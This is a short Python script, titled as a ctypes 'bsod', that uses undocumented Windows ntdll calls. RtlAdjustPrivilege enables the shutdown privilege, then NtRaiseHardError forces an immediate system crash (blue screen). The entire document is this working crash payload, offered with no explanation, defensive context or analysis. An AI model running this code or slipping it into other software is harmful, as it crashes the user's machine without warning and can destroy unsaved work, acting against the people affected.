#python ctypes bsod

import ctypes

ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
ctypes.windll.ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
